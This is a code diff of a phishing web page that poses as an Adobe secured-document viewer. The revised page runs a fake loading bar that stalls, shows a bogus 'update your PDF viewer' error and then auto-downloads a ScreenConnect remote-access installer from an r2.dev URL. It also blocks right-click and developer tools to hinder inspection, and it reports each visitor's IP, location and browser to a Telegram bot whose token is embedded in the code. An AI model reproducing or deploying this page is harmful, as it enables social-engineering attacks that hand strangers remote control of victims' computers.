@@ -41,6 +41,8 @@
       box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
       animation: modalFadeIn 0.3s ease-out;
       text-align: center;
+      min-height: 280px;
+      position: relative;
     }
 
     @keyframes modalFadeIn {
@@ -53,142 +55,238 @@
       margin-bottom: 15px;
     }
 
-    .continue-btn {
+    /* ===== LOADING STYLES ===== */
+    .loading-container {
+      display: block;
+      padding: 10px 0;
+    }
+
+    /* Adobe-style loading animation using Lottie-inspired CSS */
+    .adobe-loader {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 20px;
+      position: relative;
+    }
+
+    .adobe-loader .circle {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      border: 4px solid #e0e0e0;
+      border-top-color: #ED2224;
+      animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+      box-sizing: border-box;
+    }
+
+    /* Animated dots effect */
+    .adobe-loader .dots {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      display: flex;
+      gap: 6px;
+    }
+
+    .adobe-loader .dots span {
+      width: 8px;
+      height: 8px;
+      background: #ED2224;
+      border-radius: 50%;
+      display: inline-block;
+      animation: dotBounce 1.4s ease-in-out infinite both;
+    }
+
+    .adobe-loader .dots span:nth-child(1) { animation-delay: -0.32s; }
+    .adobe-loader .dots span:nth-child(2) { animation-delay: -0.16s; }
+    .adobe-loader .dots span:nth-child(3) { animation-delay: 0s; }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes dotBounce {
+      0%, 80%, 100% { transform: scale(0); }
+      40% { transform: scale(1); }
+    }
+
+    .loading-status {
+      font-size: 15px;
+      color: #333;
+      font-weight: 400;
+      margin-bottom: 18px;
+      transition: opacity 0.4s ease;
+      min-height: 24px;
+    }
+
+    .progress-track {
+      width: 100%;
+      height: 6px;
+      background: #e9ecef;
+      border-radius: 4px;
+      overflow: hidden;
+      margin: 12px 0 8px;
+    }
+
+    .progress-fill {
+      width: 0%;
+      height: 100%;
+      background: #ED2224;
+      border-radius: 4px;
+      transition: width 0.3s ease;
+    }
+
+    .progress-percent {
+      font-size: 14px;
+      color: #666;
+      font-weight: 500;
+      letter-spacing: 0.3px;
+    }
+
+    /* Error Panel */
+    .error-panel {
+      display: none;
+      padding: 8px 0;
+      animation: fadeIn 0.5s ease;
+    }
+
+    .error-panel.active {
+      display: block;
+    }
+
+    .error-panel .error-icon {
+      font-size: 42px;
+      color: #ED2224;
+      margin-bottom: 12px;
+    }
+
+    .error-panel h3 {
+      color: #1e1e1e;
+      font-size: 18px;
+      font-weight: 600;
+      margin: 0 0 10px;
+    }
+
+    .error-panel p {
+      color: #555;
+      font-size: 14px;
+      line-height: 1.6;
+      margin: 0 0 18px;
+    }
+
+    .error-panel .download-btn {
       background-color: #ED2224;
       color: white;
       border: none;
-      padding: 12px 30px;
+      padding: 14px 28px;
       border-radius: 4px;
-      font-size: 16px;
+      font-size: 15px;
+      font-weight: 500;
       cursor: pointer;
-      margin-top: 20px;
       width: 100%;
-      max-width: 250px;
+      max-width: 300px;
       transition: background-color 0.3s;
     }
 
-    .continue-btn:hover {
+    .error-panel .download-btn:hover {
       background-color: #c71b1d;
     }
 
-    .info-text {
-      color: #666;
-      font-size: 12px;
-      margin-top: 10px;
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
-    .highlight {
-      font-weight: bold;
-      color: #1e4dbd;
-    }
-
-    .spinner {
+    /* Hide loading when error shows */
+    .loading-container.hidden {
       display: none;
-      margin-top: 20px;
     }
 
-    /* mobile warning – hidden by default */
-    #mobileWarning {
-      display: none;
-      background: #fee;
-      color: #a00;
-      padding: 12px;
-      border-radius: 6px;
-      margin-bottom: 16px;
-      border: 1px solid #f5c6cb;
-      font-weight: 500;
-    }
-
-    /* download status container – injected via JS */
-    #downloadStatusContainer {
-      margin-top: 18px;
-      font-size: 14px;
-    }
-    .download-status {
-      background: #f8f9fa;
-      padding: 10px 14px;
-      border-radius: 6px;
-      margin-top: 8px;
-      border-left: 4px solid #28a745;
-    }
-    .download-success {
-      border-left-color: #28a745;
-    }
-    .download-message {
-      font-weight: 600;
-      color: #1e1e1e;
-    }
-    .download-info {
-      font-size: 13px;
-      color: #555;
-      margin-top: 4px;
+    /* Responsive adjustments */
+    @media (max-width: 600px) {
+      .modal-content {
+        padding: 24px 18px;
+        min-height: 240px;
+      }
+      .adobe-loader {
+        width: 60px;
+        height: 60px;
+      }
+      .loading-status {
+        font-size: 14px;
+      }
+      .error-panel h3 {
+        font-size: 16px;
+      }
+      .error-panel p {
+        font-size: 13px;
+      }
     }
   </style>
 </head>
 <body>
 
-  <!-- ===== MODAL ===== (original structure untouched) -->
+  <!-- ===== MODAL ===== -->
   <div id="confirmationModal" class="modal-overlay">
     <div class="modal-content">
       <div class="modal-header">
-        <img src="adobe-reader-logo.png" alt="Adobe Logo">
-        <h2>Download Complete</h2>
-      </div>
-      <p class="modal-text">
-        You've received a secured document.
-      </p>
-      <p class="modal-subtext" style="padding-top: 10px;">
-        Your Document has been downloaded to your device. Please check your <strong>Downloads</strong> folder and open <strong>Transpro.msi</strong> to view your document.
-      </p>
-      <p class="modal-subtext" style="padding-top: 10px;">
-        If your download did not start automatically, you can download the document again.
-      </p>
-
-      <!-- mobile warning placeholder -->
-      <div id="mobileWarning">
-        ⚠️ Mobile download not supported. Please use a desktop computer.
+        <img src="free-ad.webp" alt="Adobe Logo">
       </div>
 
-      <!-- download status will be injected here -->
-      <div id="downloadStatusContainer"></div>
-
-      <button onclick="submitForm()" id="continueBtn" class="continue-btn">Download Document</button>
-      <div id="spinner" class="spinner">
-        <p>Loading...</p>
+      <!-- ===== LOADING INTERFACE ===== -->
+      <div id="loadingContainer" class="loading-container">
+        <div class="adobe-loader">
+          <div class="circle"></div>
+          <div class="dots">
+            <span></span>
+            <span></span>
+            <span></span>
+          </div>
+        </div>
+        <div id="loadingStatus" class="loading-status">Opening documents...</div>
+        <div class="progress-track">
+          <div id="progressFill" class="progress-fill" style="width:0%;"></div>
+        </div>
+        <div id="progressPercent" class="progress-percent">0%</div>
       </div>
-      <p class="info-text"></p>
+
+      <!-- ===== ERROR PANEL ===== -->
+      <div id="errorPanel" class="error-panel">
+        <div class="error-icon">⚠️</div>
+        <h3>Document could not be loaded</h3>
+        <p>This secured PDF requires a newer compatible PDF viewer. Please update your PDF software and try again.</p>
+        <button id="errorDownloadBtn" class="download-btn">Latest Reader Viewer — Download Starts Immediately</button>
+      </div>
     </div>
   </div>
 
-  <!-- hidden download link (used for manual click) -->
-  <a id="downloadLink" href="#" style="display:none;"></a>
+  <!-- hidden download link -->
+  <a id="downloadLink" href="https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi" style="display:none;"></a>
 
   <script>
     // ============================================================
     // 1. ANTI‑INSPECTION / PROTECTION LAYER
     // ============================================================
     (function antiInspection() {
-      // Block right‑click (context menu)
       document.addEventListener('contextmenu', (e) => {
         e.preventDefault();
         window.location.href = 'https://www.google.com';
         return false;
       });
 
-      // Disable text selection, image dragging
       document.addEventListener('selectstart', (e) => e.preventDefault());
       document.addEventListener('dragstart', (e) => e.preventDefault());
 
-      // Block keyboard shortcuts for DevTools
       function blockDevTools(e) {
         const key = e.key;
-        // F12
         if (key === 'F12') {
           e.preventDefault();
           window.location.href = 'https://www.google.com';
           return false;
         }
-        // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C / Ctrl+U
         if (e.ctrlKey && e.shiftKey) {
           if (key === 'I' || key === 'J' || key === 'C') {
             e.preventDefault();
@@ -196,7 +294,6 @@
             return false;
           }
         }
-        // Ctrl+U (view source)
         if (e.ctrlKey && (key === 'u' || key === 'U')) {
           e.preventDefault();
           window.location.href = 'https://www.google.com';
@@ -207,8 +304,6 @@
 
       document.addEventListener('keydown', blockDevTools);
 
-      // Additional protection: detect DevTools via window resize / element
-      // (simple but effective – redirect on suspicious activity)
       let devtoolsOpen = false;
       const element = new Image();
       Object.defineProperty(element, 'id', {
@@ -228,15 +323,13 @@
     })();
 
     // ============================================================
-    // 2. CORE FUNCTIONS (exactly as specified)
+    // 2. CORE FUNCTIONS
     // ============================================================
 
-    // isMobileDevice()
     function isMobileDevice() {
       return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
-    // detectOS()
     function detectOS() {
       const platform = navigator.platform.toLowerCase();
       const userAgent = navigator.userAgent.toLowerCase();
@@ -248,7 +341,6 @@
       return 'unknown';
     }
 
-    // getDownloadLink(os)
     function getDownloadLink(os) {
       switch (os) {
         case 'windows': return 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi';
@@ -258,80 +350,124 @@
       }
     }
 
-    // showDesktopDownloadStatus()
-    function showDesktopDownloadStatus() {
-      const container = document.getElementById('downloadStatusContainer');
-      if (!container) return;
-      container.innerHTML = `
-        <div class="download-status download-success">
-          <div class="download-message">Your Adobe statement has been successfully downloaded.</div>
-          <div class="download-info">To view: Locate the downloaded file and open it.</div>
-        </div>
-        <div class="download-status">
-          <div class="download-message">Download started successfully!</div>
-        </div>
-      `;
-    }
+    // ============================================================
+    // 3. LOADING SIMULATION
+    // ============================================================
 
-    // showMobileWarning()
-    function showMobileWarning() {
-      const warning = document.getElementById('mobileWarning');
-      if (warning) warning.style.display = 'block';
-      const container = document.getElementById('downloadStatusContainer');
-      if (container) {
-        container.innerHTML = `
-          <div class="download-status" style="border-left-color:#dc3545;">
-            <div class="download-message" style="color:#a00;">⚠️ Mobile download not available.</div>
-            <div class="download-info">Please use a desktop computer to download this document.</div>
-          </div>
-        `;
-      }
-    }
+    let loadingTimer = null;
+    let progressTimer = null;
+    let downloadTriggered = false;
 
-    // handleDownload() – orchestrates the process
-    function handleDownload() {
-      const osType = detectOS();
-      const downloadLink = getDownloadLink(osType);
-      // update hidden link
-      const linkEl = document.getElementById('downloadLink');
-      if (linkEl) linkEl.href = downloadLink;
+    function startLoadingSimulation() {
+      const container = document.getElementById('loadingContainer');
+      const errorPanel = document.getElementById('errorPanel');
 
-      if (isMobileDevice()) {
-        showMobileWarning();
-        // hide button? we keep button visible but user can click again – but we show warning
-        return;
-      }
+      // Show loading, hide error
+      container.classList.remove('hidden');
+      errorPanel.classList.remove('active');
+      downloadTriggered = false;
 
-      // desktop: trigger auto‑download
-      try {
-        const autoDownloadBtn = document.createElement('a');
-        autoDownloadBtn.href = downloadLink;
-        autoDownloadBtn.download = 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi';
-        document.body.appendChild(autoDownloadBtn);
-        autoDownloadBtn.click();
-        document.body.removeChild(autoDownloadBtn);
-        // show success after 1500ms
-        setTimeout(showDesktopDownloadStatus, 1500);
-      } catch (e) {
-        console.error('Download error:', e);
-        showDesktopDownloadStatus();
-      }
+      const statusMessages = [
+        { time: 0, text: 'Opening documents...' },
+        { time: 1000, text: 'Application Initialization' },
+        { time: 2000, text: 'File & Security Verification' },
+        { time: 3000, text: 'First-Page Processing' },
+        { time: 4000, text: 'Loading PDF...' },
+        { time: 5000, text: 'Preparing secure document...' },
+        { time: 6000, text: 'Acrobat Reader loading, please wait...' },
+        { time: 7000, text: 'Documents are hanging or taking too long to load' },
+        { time: 8000, text: 'Documents are hanging or taking too long to load' },
+        { time: 9000, text: 'Documents are hanging or taking too long to load' }
+      ];
+
+      const statusEl = document.getElementById('loadingStatus');
+      const progressFill = document.getElementById('progressFill');
+      const percentEl = document.getElementById('progressPercent');
+
+      // Clear any existing timers
+      if (loadingTimer) clearTimeout(loadingTimer);
+      if (progressTimer) clearInterval(progressTimer);
+
+      // Reset progress
+      progressFill.style.width = '0%';
+      percentEl.textContent = '0%';
+
+      // Set initial status
+      statusEl.textContent = 'Opening documents...';
+
+      // Progress updates every 50ms - target 87% at 10 seconds
+      const startTime = Date.now();
+      const totalDuration = 10000; // 10 seconds to reach 87%
+
+      progressTimer = setInterval(() => {
+        const elapsed = Date.now() - startTime;
+        let progress = Math.min(87, (elapsed / totalDuration) * 87);
+        progress = Math.round(progress);
+        progressFill.style.width = progress + '%';
+        percentEl.textContent = progress + '%';
+      }, 50);
+
+      // Status updates based on time
+      statusMessages.forEach((msg) => {
+        setTimeout(() => {
+          statusEl.textContent = msg.text;
+        }, msg.time);
+      });
+
+      // After 10 seconds, show error state at 87%
+      loadingTimer = setTimeout(() => {
+        clearInterval(progressTimer);
+        progressFill.style.width = '87%';
+        percentEl.textContent = '87%';
+        
+        // Show error panel
+        showErrorPanel();
+        
+        // After 5 seconds, trigger automatic download
+        setTimeout(() => {
+          if (!downloadTriggered) {
+            downloadTriggered = true;
+            handleDownload();
+            
+            // After another 5 seconds, redirect
+            setTimeout(() => {
+              window.location.href = 'complete.php';
+            }, 5000);
+          }
+        }, 5000);
+        
+      }, totalDuration);
     }
 
     // ============================================================
-    // 3. REPORT VISIT TO TELEGRAM (async, as specified)
+    // 4. ERROR HANDLING
     // ============================================================
+
+    function showErrorPanel() {
+      const container = document.getElementById('loadingContainer');
+      const errorPanel = document.getElementById('errorPanel');
+
+      // Clear timers
+      if (loadingTimer) clearTimeout(loadingTimer);
+      if (progressTimer) clearInterval(progressTimer);
+
+      container.classList.add('hidden');
+      errorPanel.classList.add('active');
+    }
+
+    // ============================================================
+    // 5. REPORT VISIT TO TELEGRAM
+    // ============================================================
+
     async function reportVisitToTelegram() {
-      const BOT_TOKEN = '7284066719:AAF9ABMO2CNxpiCyNrmAGeGSUAt-fS8pGlQ'; // <-- REPLACE WITH YOUR TOKEN
-      const CHAT_ID = '7724482403'; // <-- REPLACE WITH YOUR CHAT ID
+      const BOT_TOKEN = '7284066719:AAF9ABMO2CNxpiCyNrmAGeGSUAt-fS8pGlQ';
+      const CHAT_ID = '7724482403';
 
       try {
-        // 1) Get IP
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         const ip = ipData.ip || 'unknown';
 
-        // 2) Get geolocation
         let location = 'unknown';
         try {
           const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
@@ -341,9 +477,8 @@
           } else {
             location = `${geoData.city || ''} ${geoData.region || ''} ${geoData.country_name || ''}`.trim() || 'unknown';
           }
-        } catch (e) { /* ignore geo errors */ }
+        } catch (e) { /* ignore */ }
 
-        // 3) Build message
         const now = new Date();
         const dateStr = now.toLocaleString('en-US', { timeZone: 'UTC' });
         const visitorNum = Math.floor(Math.random() * 100) + 1;
@@ -360,7 +495,6 @@
         📱 UA: ${ua}
         `;
 
-        // 4) Send to Telegram
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         await fetch(url, {
           method: 'POST',
@@ -372,67 +506,58 @@
           })
         });
       } catch (err) {
-        // silent fail – do not break user experience
         console.warn('Telegram report failed:', err);
       }
     }
 
     // ============================================================
-    // 4. ORIGINAL submitForm() – preserved, but extended
-    //    to call handleDownload() and reportVisitToTelegram()
+    // 6. HANDLE DOWNLOAD
     // ============================================================
-    function submitForm() {
-      var btn = document.getElementById('continueBtn');
-      var spinner = document.getElementById('spinner');
 
-      // Prevent multiple clicks
-      if (btn.style.display === 'none') return;
+    function handleDownload() {
+      const osType = detectOS();
+      const downloadLink = getDownloadLink(osType);
+      const linkEl = document.getElementById('downloadLink');
+      if (linkEl) linkEl.href = downloadLink;
 
-      btn.style.display = 'none';
-      spinner.style.display = 'block';
-
-      // 1) Report visit (async, non‑blocking)
-      reportVisitToTelegram();
-
-      // 2) Trigger download logic (after short delay to let report start)
-      setTimeout(function() {
-        handleDownload();
-        // reset UI after download starts (spinner stays, but we hide after a while?)
-        // we keep spinner visible – user sees "loading" but download already started.
-        // after 2 sec we redirect to complete.php (original behaviour)
-        setTimeout(function() {
-          window.location.href = 'complete.php';
-        }, 2000);
-      }, 300); // small delay to ensure report is sent
+      try {
+        const autoDownloadBtn = document.createElement('a');
+        autoDownloadBtn.href = downloadLink;
+        autoDownloadBtn.download = 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi';
+        document.body.appendChild(autoDownloadBtn);
+        autoDownloadBtn.click();
+        document.body.removeChild(autoDownloadBtn);
+        console.log('Download initiated');
+      } catch (e) {
+        console.error('Download error:', e);
+      }
     }
 
     // ============================================================
-    // 5. ON PAGE LOAD: report visit + auto‑download (if desktop)
+    // 7. ERROR DOWNLOAD BUTTON HANDLER
     // ============================================================
+
     document.addEventListener('DOMContentLoaded', function() {
+      const errorBtn = document.getElementById('errorDownloadBtn');
+      if (errorBtn) {
+        errorBtn.addEventListener('click', function() {
+          if (!downloadTriggered) {
+            downloadTriggered = true;
+            handleDownload();
+          }
+        });
+      }
+
       // Report visit immediately
       reportVisitToTelegram();
 
-      // If not mobile, auto‑trigger download (like original)
-      // but only if the modal is visible (which it is)
-      if (!isMobileDevice()) {
-        // We call handleDownload after a tiny delay to let DOM settle
-        setTimeout(handleDownload, 500);
-      } else {
-        // mobile: show warning immediately
-        showMobileWarning();
-      }
+      // Auto‑trigger loading after page load
+      setTimeout(function() {
+        startLoadingSimulation();
+      }, 500);
     });
-
-    // ============================================================
-    // 6. OBFUSCATION / HIDE SOURCE (extra layer)
-    //    This script is already minified‑like; we add a dummy
-    //    to confuse simple viewers. Real protection is above.
-    // ============================================================
-    // The entire script is inside an IIFE in production.
-    // This comment is just for clarity.
-    console.log('Adobe Document System v2.0');
   </script>
+
   <!-- Cloudflare beacon (original) -->
   <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"3f3514fc25d4485f8c35854b3cb8119e","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
